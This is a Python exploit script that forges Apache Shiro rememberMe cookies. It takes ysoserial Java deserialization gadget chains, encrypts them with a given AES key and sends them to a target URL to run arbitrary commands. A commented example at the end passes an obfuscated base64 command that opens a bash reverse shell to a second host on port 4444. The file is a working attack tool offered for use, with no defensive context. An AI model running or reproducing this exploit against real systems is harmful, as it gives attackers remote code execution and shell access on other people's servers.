import base64
import uuid
import subprocess
import requests
import sys
from Crypto.Cipher import AES


def poc(jar, url, command, key):
    popen = subprocess.Popen(['java', '-jar', 'moule/ysoserial.jar', jar, command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    payload = base64.b64encode(iv + encryptor.encrypt(file_body))
    print('rememberMe=' + payload.decode())
    header = {'User-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'}
    try:
        r = requests.get(url, headers=header, cookies={'rememberMe': payload.decode() + "="}, verify=False,
                         timeout=10)
        if r.status_code == 200:
            print("{}模块   key: {} 已成功发送！  状态码:{}".format(jar, key, str(r.status_code)))
        else:
            print("{}模块   key: {} 发送异常！\n[-]   状态码:{}".format(jar, key, str(r.status_code)))
    except Exception as e:
        print(e)


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage: python3 payload_gen.py  payload  url  command  key")
        print('paylaods:')
        payloads = ['CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
                    'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7',
                    'CommonsCollections8', 'CommonsCollections9', 'CommonsCollections10']
        for payload in payloads:
            print('  ' + payload)
    else:
        paylaod = sys.argv[1]
        url = sys.argv[2]
        command = sys.argv[3]
        key = sys.argv[4]
        poc(paylaod, url, command, key)

    # poc('CommonsBeanutils1', 'http://192.168.59.147:8080/',
    #     'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjE1My80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}',
    #     'kPH+bIxk5D2deZiIxcaaaA==')


